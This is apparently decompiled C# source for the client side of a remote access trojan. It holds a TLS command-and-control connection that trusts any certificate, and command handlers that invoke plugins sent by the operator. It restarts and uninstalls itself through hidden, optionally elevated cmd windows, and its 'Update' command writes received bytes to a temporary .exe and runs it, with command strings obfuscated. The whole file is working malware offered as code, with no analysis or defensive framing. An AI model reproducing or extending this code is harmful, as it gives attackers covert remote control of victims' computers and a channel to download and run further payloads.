using System;
using System.Diagnostics;
using System.IO;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using Leb128;

namespace Client.Helper;

public class Client : IClient
{
	public Socket socket;

	public SslStream SslClient;

	public byte[] ClientBuffer;

	public bool ClientBufferRecevied;

	public int HeaderSize;

	public int Offset;

	public object SendSync;

	public PingChecker pingChecker;

	public LastPing lastPing;

	public bool itsConnect { get; set; }

	public void Connect(string ip, string port)
	{
		try
		{
			socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
			socket.ReceiveBufferSize = 512000;
			socket.SendBufferSize = 512000;
			socket.Connect(ip, Convert.ToInt32(port));
			if (socket.Connected)
			{
				SendSync = new object();
				SslClient = new SslStream(new NetworkStream(socket, ownsSocket: true), leaveInnerStreamOpen: false, ValidateServerCertificate);
				SslClient.AuthenticateAsClient(socket.RemoteEndPoint.ToString().Split(new char[1] { ':' })[0], null, SslProtocols.Tls12, checkCertificateRevocation: false);
				Offset = 0;
				HeaderSize = 4;
				ClientBuffer = new byte[HeaderSize];
				ClientBufferRecevied = false;
				SslClient.BeginRead(ClientBuffer, Offset, HeaderSize, ReadData, null);
			}
			itsConnect = socket.Connected;
		}
		catch (Exception)
		{
			itsConnect = false;
		}
	}

	private bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
	{
		return true;
	}

	public void Disconnect()
	{
		itsConnect = false;
		ClientBuffer = null;
		HeaderSize = 0;
		Offset = 0;
		if (pingChecker != null)
		{
			pingChecker.Disconnect();
		}
		if (lastPing != null)
		{
			lastPing.Disconnect();
		}
		if (socket != null)
		{
			socket.Dispose();
		}
		if (SslClient != null)
		{
			SslClient.Dispose();
		}
	}

	public void ReadData(IAsyncResult ar)
	{
		if (!itsConnect)
		{
			return;
		}
		try
		{
			int num = SslClient.EndRead(ar);
			if (num > 0)
			{
				HeaderSize -= num;
				Offset += num;
				if (!ClientBufferRecevied)
				{
					ProcessClientBufferNotReceived();
				}
				else
				{
					ProcessClientBufferReceived();
				}
				if (itsConnect)
				{
					SslClient.BeginRead(ClientBuffer, Offset, HeaderSize, ReadData, null);
				}
			}
			else
			{
				itsConnect = false;
			}
		}
		catch (Exception)
		{
			itsConnect = false;
		}
	}

	public void ProcessClientBufferReceived2()
	{
		Offset = 0;
		HeaderSize = 4;
		ClientBuffer = new byte[HeaderSize];
		ClientBufferRecevied = false;
	}

	public void ProcessClientBufferReceived1()
	{
		new Thread(Read).Start(ClientBuffer);
		ProcessClientBufferReceived2();
	}

	public void ProcessClientBufferReceived()
	{
		if (HeaderSize == 0)
		{
			ProcessClientBufferReceived1();
		}
		else if (HeaderSize < 0)
		{
			itsConnect = false;
		}
	}

	public void ProcessClientBufferNotReceived1()
	{
		HeaderSize = BitConverter.ToInt32(ClientBuffer, 0);
		if (HeaderSize > 0)
		{
			ClientBuffer = new byte[HeaderSize];
			Offset = 0;
			ClientBufferRecevied = true;
		}
	}

	public void ProcessClientBufferNotReceived()
	{
		if (HeaderSize == 0)
		{
			ProcessClientBufferNotReceived1();
		}
		else if (HeaderSize < 0)
		{
			itsConnect = false;
		}
	}

	public void Error(string exp)
	{
		Send(LEB128.Write(new object[2]
		{
			EncryptString.Decode("Error"),
			exp
		}));
	}

	public void Send(byte[] Data)
	{
		if (!itsConnect)
		{
			return;
		}
		lock (SendSync)
		{
			try
			{
				byte[] bytes = BitConverter.GetBytes(Data.Length);
				byte[] array = new byte[4 + Data.Length];
				Array.Copy(bytes, 0, array, 0, bytes.Length);
				Array.Copy(Data, 0, array, 4, Data.Length);
				socket.Poll(-1, SelectMode.SelectWrite);
				SslClient.Write(array, 0, array.Length);
				SslClient.Flush();
			}
			catch (Exception)
			{
				itsConnect = false;
			}
		}
	}

	public void Read(object data)
	{
		object[] array = LEB128.Read((byte[])data);
		if (lastPing != null)
		{
			lastPing.Last();
		}
		if ((string)array[0] == EncryptString.Decode("Invoke"))
		{
			PluginLoader.Invoke(array, this);
		}
		if ((string)array[0] == EncryptString.Decode("SaveInvoke"))
		{
			PluginLoader.SaveInvoke(array, this);
		}
		if ((string)array[0] == EncryptString.Decode("Pong"))
		{
			pingChecker.Stop(this);
		}
		if ((string)array[0] == EncryptString.Decode("Exit"))
		{
			Methods.Exit();
		}
		if ((string)array[0] == EncryptString.Decode("Restart"))
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.UseShellExecute = false;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.FileName = EncryptString.Decode("cmd");
			processStartInfo.Arguments = EncryptString.Decode("/k timeout 5 > NUL && \"") + Methods.GetExecutablePath() + EncryptString.Decode("\"");
			if (Config.Privilege == EncryptString.Decode("Admin"))
			{
				processStartInfo.Verb = EncryptString.Decode("runas");
			}
			Process process = new Process();
			process.StartInfo = processStartInfo;
			process.Start();
			Thread.Sleep(new Random().Next(2000, 3000));
			Methods.Exit();
		}
		if ((string)array[0] == EncryptString.Decode("Uninstall"))
		{
			if (Config.Install == EncryptString.Decode("false"))
			{
				Methods.Exit();
			}
			ProcessStartInfo processStartInfo2 = new ProcessStartInfo();
			processStartInfo2.UseShellExecute = true;
			processStartInfo2.CreateNoWindow = true;
			processStartInfo2.RedirectStandardOutput = false;
			processStartInfo2.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo2.FileName = EncryptString.Decode("cmd");
			processStartInfo2.Arguments = EncryptString.Decode("/c \"") + Install.Uninstall() + EncryptString.Decode("\"");
			processStartInfo2.Verb = EncryptString.Decode("runas");
			Process process2 = new Process();
			process2.StartInfo = processStartInfo2;
			process2.Start();
			Thread.Sleep(2000);
			Methods.Exit();
		}
		if ((string)array[0] == EncryptString.Decode("Update"))
		{
			string text = Path.GetTempFileName() + EncryptString.Decode(".exe");
			File.WriteAllBytes(text, (byte[])array[1]);
			ProcessStartInfo processStartInfo3 = new ProcessStartInfo();
			processStartInfo3.UseShellExecute = false;
			processStartInfo3.CreateNoWindow = true;
			processStartInfo3.RedirectStandardOutput = true;
			processStartInfo3.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo3.FileName = EncryptString.Decode("cmd");
			processStartInfo3.Arguments = EncryptString.Decode("/k timeout 10 > NUL && \"") + text + EncryptString.Decode("\"");
			if (Config.Privilege == EncryptString.Decode("Admin"))
			{
				processStartInfo3.Verb = EncryptString.Decode("runas");
			}
			Process process3 = new Process();
			process3.StartInfo = processStartInfo3;
			process3.Start();
			string text2 = Install.Uninstall();
			if (Config.Install == EncryptString.Decode("false"))
			{
				Methods.Exit();
			}
			ProcessStartInfo processStartInfo4 = new ProcessStartInfo();
			processStartInfo4.UseShellExecute = true;
			processStartInfo4.CreateNoWindow = true;
			processStartInfo4.RedirectStandardOutput = false;
			processStartInfo4.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo4.FileName = EncryptString.Decode("cmd");
			processStartInfo4.Arguments = EncryptString.Decode("/c \"") + text2 + EncryptString.Decode("\"");
			processStartInfo4.Verb = EncryptString.Decode("runas");
			Process process4 = new Process();
			process4.StartInfo = processStartInfo4;
			process4.Start();
			Thread.Sleep(2000);
			Methods.Exit();
		}
	}
}
